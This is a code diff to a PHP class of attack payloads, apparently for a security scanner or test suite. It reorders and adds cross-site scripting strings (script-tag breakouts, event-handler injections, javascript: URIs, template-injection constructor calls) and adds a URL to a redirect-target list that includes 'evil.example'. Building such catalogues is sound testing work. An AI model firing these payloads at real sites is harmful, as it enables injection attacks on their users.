@@ -34,18 +34,21 @@ final class AttackCatalogPayloads
     public static function xss(): array
     {
         return [
-            '<script>alert(1)</script>',
+            '--></script></title></textarea></style><script>alert(1)</script>',
             '<img src=x onerror=alert(1)>',
+            '"><script>alert(1)</script>',
+            'javascript:alert(1)',
+            "'-alert(1)-'",
+            'constructor.constructor("alert(1)")()',
+            '{{constructor.constructor("alert(1)")()}}',
+            'alert(1)',
+            '<script>alert(1)</script>',
             '<iframe src="javascript:alert(`xss`)">',
             '<svg onload=alert(1)>',
             '<body onload=alert(1)>',
-            '"><script>alert(1)</script>',
-            "'-alert(1)-'",
-            'javascript:alert(1)',
             '<img src=x onerror=alert(document.domain)>',
             '<details open ontoggle=alert(1)>',
             '<math><mtext></mtext><script>alert(1)</script>',
-            '{{constructor.constructor("alert(1)")()}}',
         ];
     }
 
@@ -202,6 +205,7 @@ final class AttackCatalogPayloads
             'https://evil.example',
             'https://example.com',
             'https://owasp.org',
+            'https://github.com/juice-shop/juice-shop',
             '//google.com',
         ];
     }
